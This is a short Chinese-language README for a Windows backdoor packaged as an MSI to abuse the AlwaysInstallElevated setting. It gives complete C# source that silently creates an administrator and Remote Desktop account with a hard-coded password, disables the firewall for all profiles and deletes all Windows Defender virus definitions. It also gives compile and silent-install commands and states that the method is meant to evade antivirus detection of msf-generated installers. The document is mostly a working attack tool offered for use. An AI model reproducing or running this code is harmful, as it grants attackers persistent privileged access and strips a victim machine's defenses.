# backdoor-msi

利用AlwaysInstallElevated，安装程序，创建管理员用户，关闭防火墙，清除Windows Defender 病毒库。

由于msf直接生成的msi会被杀，所以才用这种方式

## 编译exe

源码

```csharp
using System.Diagnostics;

class Backdoor
{
    static void Main()
    {
        // 创建新用户并加入管理员组和远程桌面组 - Create new user and add to administrators and remote desktop groups
        Cmd("net user rasalghul Test123456 /add");       // 添加用户 - Add user
        Cmd("net localgroup Administrators rasalghul /add"); // 提升为管理员 - Elevate to administrator
        Cmd("net localgroup \"Remote Desktop Users\" rasalghul /add"); // 允许远程桌面 - Allow remote desktop

        // 关闭所有配置文件的防火墙 - Turn off firewall for all profiles
        Cmd("netsh advfirewall set allprofiles state off");

        // 移除 Windows Defender 的所有病毒定义使其失效 - Remove all virus definitions to blind Defender
        Cmd("\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All");
    }

    // 执行命令的封装方法 - Wrapper method for executing commands
    static void Cmd(string args)
    {
        Process.Start(new ProcessStartInfo("cmd.exe", "/c " + args)
        {
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            UseShellExecute = false
        })?.WaitForExit();
    }
}
```

编译

```bash
csc /platform:x64 /out:backdoor.exe backdoor.cs
```

## 转换

使用：[Free Download - MSI Wrapper Convert EXE to MSI free](https://www.exemsi.com/download/)

![image](../image-20260623030855-7njyllm.png)

![image](../image-20260623030944-7yp7op2.png)

![image](../image-20260623031241-4el2gh9.png)

![image](../image-20260623031355-06ye9kt.png)

## 使用

```csharp
msiexec /quiet /qn /i backdoor.msi
```
